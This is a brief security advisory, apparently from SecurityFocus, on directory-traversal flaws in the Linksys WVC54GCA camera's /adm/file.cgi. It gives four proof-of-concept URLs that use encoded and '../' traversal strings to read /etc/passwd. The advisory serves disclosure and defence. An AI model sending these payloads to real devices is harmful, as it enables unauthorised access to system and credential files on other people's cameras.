source: https://www.securityfocus.com/bid/34713/info

Linksys WVC54GCA Wireless-G Internet Home Monitoring Camera is prone to multiple directory-traversal vulnerabilities because the software fails to sufficiently sanitize user-supplied input.

An attacker can exploit these issues using directory-traversal strings ('../') to download arbitrary files with the privileges of the server process. Information obtained may aid in further attacks.

Linksys WVC54GCA Wireless-G Internet Home Monitoring Camera firmware 1.00R22 and 1.00R24 are affected; other versions may also be vulnerable. 

http://www.example.com/adm/file.cgi?next_file=%2fetc%2fpasswd
http://www.example.com/adm/file.cgi?next_file=%2fetc/passwd
http://www.example.com/adm/file.cgi?next_file=%2e.%2f%2e.%2f%2e.%2f%2e.%2fetc%2fpasswd
http://www.example.com/adm/file.cgi?todo=pwnage&this_file=/etc/passwd